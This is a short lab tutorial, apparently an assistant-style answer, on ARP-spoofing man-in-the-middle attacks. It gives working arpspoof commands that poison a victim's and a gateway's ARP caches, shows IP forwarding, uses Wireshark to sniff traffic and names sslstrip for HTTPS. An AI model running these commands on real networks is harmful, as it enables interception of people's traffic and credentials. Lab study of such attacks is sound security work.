Intercepting network traffic with `arpspoof` is a classic **Man-in-the-Middle (MitM)** technique. Here’s how you can perform it **safely in a lab** using a **VM** or **router** (like in a VirtualBox/VMware or physical network testbed). **Never use this on unauthorized networks.**


## ✅ LAB SETUP (Virtual)

**Devices:**

* Kali Linux VM (attacker)
* Windows or Ubuntu VM (victim)
* Router/Gateway (could be your default VM gateway or a pfSense VM)

**Network Mode:**

* All VMs on the same **NAT Network** or **Bridged Adapter** so they can see each other.


## 🔧 Steps to Intercept Traffic Using `arpspoof`

### 1. **Enable IP Forwarding on Attacker**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 2. **Find Victim and Gateway IP**

Use `ip a`, `arp -a`, or `netdiscover` to find:

* Victim IP: `192.168.1.100`
* Gateway IP: `192.168.1.1`

### 3. **Run arpspoof**

Open two terminals:

**Terminal 1** (spoofing victim):

```bash
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

**Terminal 2** (spoofing gateway):

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

This tricks both the victim and the gateway into sending traffic to **you**, making you the MITM.

### 4. **Sniff the Traffic**

Use `Wireshark`:

```bash
wireshark &
```

* Apply filter: `ip.addr == 192.168.1.100`

Now you can see **unencrypted** traffic like HTTP, DNS, etc.



### 🔐 Bonus: View HTTPS Traffic (Advanced)

HTTPS is encrypted, so use `mitmproxy`, `Bettercap`, or SSL stripping tools like:

```bash
sslstrip
```

Note: Modern sites use HSTS, so SSL stripping often fails now.



### 🛑 Clean Up

* Kill all `arpspoof` processes.
* Reset victim ARP cache manually or by rebooting.
* Disable IP forwarding:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```
